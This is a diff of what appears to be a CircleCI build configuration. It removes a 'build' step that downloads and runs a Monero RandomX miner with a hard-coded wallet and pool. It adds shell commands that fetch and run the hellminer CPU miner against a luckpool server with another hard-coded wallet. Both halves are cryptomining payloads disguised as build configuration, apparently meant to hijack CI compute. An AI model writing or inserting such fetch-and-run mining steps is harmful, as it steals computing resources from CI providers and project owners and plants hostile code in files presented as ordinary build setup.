@@ -1,11 +1,5 @@
-version: 2.0
-jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet  42xjhmsiAWPCn8m6o1iqvpFSZwSv71GZJRzcykwsx8s8UffLKnhSN15CzEWsKDanrGP9DyZru4t7YNzPqTGGLM8U8AujuEC -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3960#xnsub -u RQkALm85YgRbQ3EpGk4qXSNGAkkbPgZgLw.GitHup -p x --cpu 16
